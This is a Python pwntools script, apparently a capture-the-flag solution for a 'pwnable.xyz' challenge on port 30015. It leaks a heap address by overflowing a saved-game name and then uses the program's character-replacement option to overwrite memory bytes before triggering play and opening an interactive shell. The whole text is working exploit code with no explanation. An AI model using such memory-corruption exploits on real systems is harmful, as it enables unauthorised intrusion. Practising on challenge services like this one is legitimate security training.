from pwn import *



def play(inp):
    sh.sendlineafter('> ', '1')
    sleep(1)
    sh.send(inp)


def save_game(name):
    sh.sendlineafter('> ', '2')
    sh.sendafter(': ', name)


def delete_save(num):
    sh.sendlineafter('> ', '3')
    sh.sendlineafter(': ', str(num))


def print_name():
    sh.sendlineafter('> ', '4')


def change_char(ochar, nchar):
    sh.sendlineafter('> ', '5')
    sh.sendlineafter(': ', ochar)
    sh.sendlineafter(': ', nchar)




#sh = process('./challenge')
sh = remote('svc.pwnable.xyz',30015)

name = 'AAAA'
sh.sendlineafter('Name: ', name)
save_game('B'*0x7f + 'C')
print_name()
print sh.recvuntil('C')


heap_addr = u64(sh.recvline()[:-1].ljust(8, '\x00'))


print "heap_addr = ", hex(heap_addr)
change_char('\x46', '\x01')
change_char('\x46', '\x01')
change_char('\x46', '\x01')
change_char('\x46', '\x01')


change_char('\x6b', '\xf3')
change_char('\x0d', '\x0c')
sh.sendlineafter('> ', '1')

sh.interactive()


